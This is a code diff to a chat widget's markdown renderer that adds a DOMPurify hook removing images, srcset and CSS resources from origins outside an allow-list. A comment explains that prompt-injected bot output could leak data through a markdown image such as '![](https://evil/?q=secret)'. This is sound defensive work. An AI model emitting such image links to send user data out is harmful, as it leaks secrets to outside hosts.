@@ -3,6 +3,7 @@ import { Marked, Renderer, type Tokens } from 'marked';
 import { ChatWidgetOptions, ReportPerson } from './types';
 import {
   escapeHtml,
+  isAllowedResourceUrl,
   renderImageAndLink,
   safeUrl,
   updateChartCode,
@@ -10,6 +11,12 @@ import {
 
 const REPORT_ARROW_SVG =
   '<svg class="chat-message-children-report-arrow" width="27" height="104" viewBox="0 0 27 104" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M26.3536 99.6464C26.5488 99.8417 26.5488 100.158 26.3536 100.354L23.1716 103.536C22.9763 103.731 22.6597 103.731 22.4645 103.536C22.2692 103.34 22.2692 103.024 22.4645 102.828L25.2929 100L22.4645 97.1716C22.2692 96.9763 22.2692 96.6597 22.4645 96.4645C22.6597 96.2692 22.9763 96.2692 23.1716 96.4645L26.3536 99.6464ZM1 0H1.5V96H1H0.5V0H1ZM5 100V99.5H26V100V100.5H5V100ZM1 96H1.5C1.5 97.933 3.067 99.5 5 99.5V100V100.5C2.51472 100.5 0.5 98.4853 0.5 96H1Z" fill="#783F8E"/></svg>';
+
+const FLAG_BASE_URL =
+  'https://public-assets-rp.s3.eu-central-1.amazonaws.com/flags/';
+
+// Attributes that make the browser fetch a URL without user interaction
+const RESOURCE_ATTRIBUTES = ['src', 'poster', 'href', 'xlink:href', 'background'];
 
 /**
  * Create a markdown-to-HTML function for bot messages.
@@ -20,6 +27,8 @@ const REPORT_ARROW_SVG =
  *
  * Bot text is untrusted (it can be steered by prompt injection), so the final
  * HTML is always passed through DOMPurify before it reaches `innerHTML`.
+ * Resources from origins outside `options.allowedResourceOrigins` are removed,
+ * so a response can't leak data through e.g. `![](https://evil/?q=secret)`.
  */
 export function createMarkdownRenderer(
   options: ChatWidgetOptions,
@@ -98,7 +107,7 @@ export function createMarkdownRenderer(
       return `<span>${safeCountry}</span>`;
     }
     return `<div class="chat-message-flag-container">
-          <img src="https://public-assets-rp.s3.eu-central-1.amazonaws.com/flags/${code.toLowerCase()}.svg" alt="${safeCountry}" />
+          <img src="${FLAG_BASE_URL}${code.toLowerCase()}.svg" alt="${safeCountry}" />
           <span>${safeCountry}</span>
           </div>`;
   };
@@ -173,8 +182,30 @@ export function createMarkdownRenderer(
     },
   });
 
+  const allowedOrigins = [
+    ...(options.allowedResourceOrigins ?? []),
+    new URL(FLAG_BASE_URL).origin,
+  ];
+  const isAllowed = (url: string) => isAllowedResourceUrl(url, allowedOrigins);
+
   // A private DOMPurify instance, so hooks don't affect the host page
   const purify = DOMPurify(window);
+  purify.addHook('uponSanitizeAttribute', (node, data) => {
+    const { attrName, attrValue } = data;
+    if (attrName === 'style') {
+      // url(), image-set() etc. load resources; CSS escapes can hide them
+      data.keepAttr = !/\\|url|image|src/i.test(attrValue);
+    } else if (attrName === 'srcset') {
+      data.keepAttr = attrValue
+        .split(',')
+        .every((candidate) => isAllowed(candidate.trim().split(/\s+/)[0]));
+    } else if (
+      RESOURCE_ATTRIBUTES.includes(attrName) &&
+      !['A', 'AREA'].includes(node.nodeName.toUpperCase())
+    ) {
+      data.keepAttr = isAllowed(attrValue);
+    }
+  });
   purify.addHook('afterSanitizeAttributes', (node) => {
     if (node.tagName === 'A' && node.hasAttribute('href')) {
       node.setAttribute('target', '_blank');
